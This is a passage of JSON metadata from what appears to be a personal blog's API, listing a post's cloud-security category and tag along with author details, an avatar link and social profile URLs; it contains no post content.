mins."},"categories":[{"name":"云安全","slug":"云安全","count":3,"path":"api/categories/云安全.json"}],"tags":[{"name":"云安全","slug":"云安全","count":3,"path":"api/tags/云安全.json"}],"author":{"name":"Hao","slug":"blog-author","avatar":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/64966b30e1c9375e8dbb11146ea9c12f.jpg","link":"/","description":"山高自有客行路，水深自有渡船认 The future is like the sea and three will be a long time to come","socials":{"github":"https://github.com/isMyHao","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/","csdn":"https://blog.csdn.net/2401_87971103?spm=1000.2115.3001.10640","juejin":"","customs":{}}},"feature":true}}